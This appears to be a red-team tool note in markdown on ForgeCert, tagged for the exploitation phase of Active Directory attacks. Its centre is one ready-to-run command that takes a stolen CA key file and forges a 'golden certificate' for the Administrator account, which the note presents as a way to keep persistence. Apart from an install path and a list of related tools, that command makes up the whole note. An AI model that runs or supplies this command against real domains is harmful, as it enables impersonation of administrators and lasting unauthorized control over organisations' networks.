---
tags: [tool, activedirectory, certificate]
tool: "forcert"
category: "Active Directory"
installed: true
phase: [exploitation]
---

# ForgeCert - Golden Certificate Creation

## Tool Overview
Purpose: Forge golden certificates for persistence
Location: ~/tools/activedirectory/windows/ForgeCert.exe

## How to Use It
ForgeCert.exe --CaConfigurationFile ca.pfx --Subject "CN=Administrator" --NotBefore "2023-01-01" --NotAfter "2025-01-01" --Output admin.pfx

## Related Tools
certipy, pywhisker
